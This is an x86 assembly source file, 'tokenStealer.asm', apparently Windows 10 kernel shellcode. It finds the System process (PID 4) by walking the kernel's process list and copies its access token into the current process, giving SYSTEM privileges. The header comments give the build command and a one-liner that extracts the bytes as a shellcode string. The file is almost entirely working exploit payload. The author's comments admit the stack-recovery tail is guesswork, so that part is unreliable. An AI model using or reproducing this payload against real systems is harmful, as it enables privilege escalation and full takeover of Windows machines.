; nasm -f win32 tokenStealer.asm -o tokenStealer.obj 
; bash: for i in $(objdump -D tokenStealer.obj | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
[bits 32]

global _start

_start:
    pushad                  ; Save registers
    xor eax, eax            ; Zero out eax
    mov eax, fs:[eax+0x124] ; Get _KTHREAD pointer from KPCR
    mov eax, [eax + 0x80]   ; Get _EPROCESS pointer
    mov ecx, eax            ; Copy _EPROCESS INTO ecx
    mov edx, 0x4            ; Win 10 x86 System PID: 0x4 

    FindSystemPid:
        mov eax, [eax+0x0e8]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
        sub eax, 0x0e8          ; Get _EPROCESS base address
        cmp [eax+0x0e4], edx    ; Check if PID matches System PID (0x4) 
        jne FindSystemPid       ; Continue until System Process is found
    
    mov edx, [eax + 0x12c]      ; Get System process token
    mov [ecx + 0x12c], edx      ; Replace current process token with System token
    popad                       ; return to previous register state

    ;IDK, some kernel recovery stuff
    xor eax, eax            ; set NTSTATUS SUCCESS
    ;xor esi, esi
    ;xor edi, edi
    ;add esp, 0x10           ; Fix stack alignment
    sub esp, 0x4
    ;mov edx, 0x00010002     ; Idk, looks cool
    ;mov ebx, 0x0000010e     ; Idk, looks cool
    mov ecx, eax
    mov eax, ecx
    pop ebp                 ; restore stack base
    ret 8                   ; clean return